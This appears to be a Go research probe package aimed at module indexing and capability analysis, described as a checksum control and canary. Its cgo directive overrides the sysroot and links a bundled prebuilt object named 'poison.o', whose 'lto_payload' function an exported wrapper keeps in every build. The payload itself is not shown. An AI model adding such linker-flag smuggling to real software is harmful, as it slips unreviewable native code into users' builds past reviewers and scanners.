package pkgsiteprobe

/*
#cgo linux,amd64 LDFLAGS: --sysroot ${SRCDIR}/sysroot ${SRCDIR}/x86_64-gcc/poison.o
int lto_payload(void);
*/
import "C"

import crosswritecanary "github.com/benr00t3d/go-byteman-crosswrite-canary"

// Present is a harmless exported symbol for documentation indexing.
const Present = true

// ProbeVersion forces a fresh package-analysis input.
const ProbeVersion = "v0.0.141-sumc-capslock-checksum-control"

// OwnedBBaseline makes the independent researcher-owned B module a real
// dependency. This matched control publishes B's canonical go.sum entries.
const OwnedBBaseline = crosswritecanary.Baseline

// LTOValue keeps the bundled LTO object in cgo's link input.
func LTOValue() int { return int(C.lto_payload()) }
